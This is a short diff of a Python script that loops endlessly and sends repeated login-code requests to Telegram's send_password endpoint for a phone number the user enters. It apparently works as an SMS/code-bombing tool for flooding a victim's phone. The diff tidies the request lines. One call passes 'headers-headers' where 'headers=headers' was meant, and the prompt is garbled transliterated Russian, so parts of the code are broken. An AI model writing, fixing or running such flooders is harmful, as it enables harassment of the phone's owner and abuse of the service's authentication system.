@@ -8,13 +8,13 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
  
 while True:
  try:
-     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
      print('+')
+     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
  except:
      print('=')
  try:
      print('+')
-     requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={'phone': "+" + number})
+     response = requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('=')
  try:
